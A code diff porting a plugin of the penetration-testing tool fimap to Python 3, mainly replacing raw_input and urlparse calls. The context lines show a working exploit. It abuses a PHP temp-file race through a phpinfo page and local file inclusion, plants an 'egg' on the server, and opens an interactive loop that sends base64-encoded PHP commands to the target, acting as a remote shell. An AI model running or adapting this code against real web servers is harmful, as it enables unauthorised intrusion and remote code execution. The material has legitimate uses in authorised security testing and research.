@@ -1,4 +1,9 @@
 from __future__ import print_function
+from future import standard_library
+standard_library.install_aliases()
+from builtins import str
+from builtins import input
+from builtins import range
 from plugininterface import basePlugin
 
 # This plugin is based on Insomnia Security's Whitepaper:
@@ -7,7 +12,7 @@ from plugininterface import basePlugin
 # Plugin by Iman Karim <fimap.dev@gmail.com>
 # License: GPLv2
 
-import urlparse, re, socket, threading, base64, urllib, string, random
+import urllib.parse, re, socket, threading, base64, urllib.request, urllib.parse, urllib.error, string, random
 
 
 
@@ -97,20 +102,20 @@ class TempFileAbuse(basePlugin):
                 options.append("q. Back to fimap")
                 
                 haxhelper.drawBox("PHPInfo Coldwind/Insomnia Glitch", options)
-                inp = raw_input("Choose action: ")
+                inp = input("Choose action: ")
                 
                 try:
                     idx = int(inp)
                     
                     if (idx == 1):
-                        self.phpinfourl = raw_input("Please type in the complete URL of the PHPInfo() file: ")
+                        self.phpinfourl = input("Please type in the complete URL of the PHPInfo() file: ")
                         print("PHPInfo() URL changed to: %s" %(self.phpinfourl))
                     
                     elif (idx == 2):
                         print("AutoProbe not implemented right now :(")
                         
                     elif (idx == 3):
-                        tmp = raw_input("Please type in the number of attempts you wish: ")
+                        tmp = input("Please type in the number of attempts you wish: ")
                         try:
                             n = int(tmp)
                             if (n <= 0):
@@ -122,7 +127,7 @@ class TempFileAbuse(basePlugin):
                             print("Invalid number.")
                         
                     elif (idx == 4):
-                        tmp = raw_input("Please type in the number of threads you wish: ")
+                        tmp = input("Please type in the number of threads you wish: ")
                         try:
                             n = int(tmp)
                             if (n <= 0):
@@ -134,11 +139,11 @@ class TempFileAbuse(basePlugin):
                             print("Invalid number.")
                         
                     if (idx == 5):
-                        self.egg = raw_input("Please type location where to try to drop the egg: ")
+                        self.egg = input("Please type location where to try to drop the egg: ")
                         print("EggDrop location changed to: %s" %(self.egg))
                     
                     elif (idx == 6):
-                        tmp = raw_input("Please type in the number of trash to append: ")
+                        tmp = input("Please type in the number of trash to append: ")
                         try:
                             n = int(tmp)
                             if (n < 0):
@@ -171,15 +176,15 @@ class TempFileAbuse(basePlugin):
                             
                                 path, postdata, header, trash = haxhelper.getHaxDataForCustomFile(self.egg)
                                 
-                                domain = urlparse.urlsplit(self.phpinfourl)[1]
-                                url = urlparse.urljoin("http://" + domain, path)
+                                domain = urllib.parse.urlsplit(self.phpinfourl)[1]
+                                url = urllib.parse.urljoin("http://" + domain, path)
                                 
                                 post = ""
                                 
                                 if (postdata != ""):
                                     post = postdata + "&"
                                 
-                                post += urllib.urlencode({"data": base64.b64encode(quiz)})
+                                post += urllib.parse.urlencode({"data": base64.b64encode(quiz)})
                                 res = haxhelper.doRequest(url, post, header)
                                 
                                 if (res == answer):
@@ -196,7 +201,7 @@ class TempFileAbuse(basePlugin):
                                             code = item.generatePayload(shell_test_code)
                                             code = code.replace("<?php", "")
                                             code = code.replace("?>", "")
-                                            testload = urllib.urlencode({"data": base64.b64encode(code)})
+                                            testload = urllib.parse.urlencode({"data": base64.b64encode(code)})
                                             
                                             if (postdata != ""):
                                                 testload = "%s&%s" %(postdata, testload)
@@ -213,18 +218,18 @@ class TempFileAbuse(basePlugin):
                                                 print("Upload your own shell to be on the safe side.")
                                                 print("--------------------------------------------------------------------")  
                                                 
-                                                payload = raw_input(shell_banner)
+                                                payload = input(shell_banner)
                                                 
                                                 while (payload != "q" and payload != "Q"):
                                                     payload = item.generatePayload(payload)
                                                     payload = payload.replace("<?php", "")
                                                     payload = payload.replace("?>", "")
-                                                    payload = urllib.urlencode({"data": base64.b64encode(payload)})
+                                                    payload = urllib.parse.urlencode({"data": base64.b64encode(payload)})
                                                     if (postdata != ""):
                                                         payload = "%s&%s" %(postdata, payload)
                                                     code = self.doPostRequest(url, payload, header)
                                                     print(code)
-                                                    payload = raw_input(shell_banner)
+                                                    payload = input(shell_banner)
                                                 
                                                 return
                                         else:
@@ -240,8 +245,8 @@ class TempFileAbuse(basePlugin):
                     pass
             
     def createEgg(self, haxhelper):
-        host = urlparse.urlsplit(self.phpinfourl)[1]
-        path = urlparse.urlsplit(self.phpinfourl)[2]
+        host = urllib.parse.urlsplit(self.phpinfourl)[1]
+        path = urllib.parse.urlsplit(self.phpinfourl)[2]
         
         runningThreads = []
         
